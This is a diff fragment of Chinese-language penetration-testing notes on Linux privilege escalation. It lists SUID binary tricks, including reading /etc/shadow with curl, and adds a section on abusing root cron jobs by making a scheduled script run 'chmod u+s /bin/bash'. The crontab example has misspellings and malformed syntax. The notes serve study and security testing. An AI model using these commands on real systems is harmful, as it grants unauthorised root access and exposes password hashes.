@@ -34,3 +34,27 @@ find： find /etc/passwd（任意文件） -exec bash -p \:   直接进入bash�
 bash： bash -p 直接进入bash终端
 env: env bash -p 直接进入bash终端
 curl： curl file：///etc/shadow 用法和cat类似
+
+4、contab定时任务提权
+原理：
+通过向定时任务（root权限执行的那种），写入提权指令，定时任务执行后提权成功。
+场景：
+有些web提供类似功能，比如定时扫面，定时发送之类的，定时任务通常由root权限执行。可能存在
+利用方式：
+contab -l 或者 cat /var/spool/cron/root
+定时任务中写入： */1**** /opt/learn/site_check.sh
+site_check.sh中写入： chmod u+s /bin/bash
+
+
+
+
+
+
+
+
+
+
+
+
+
+
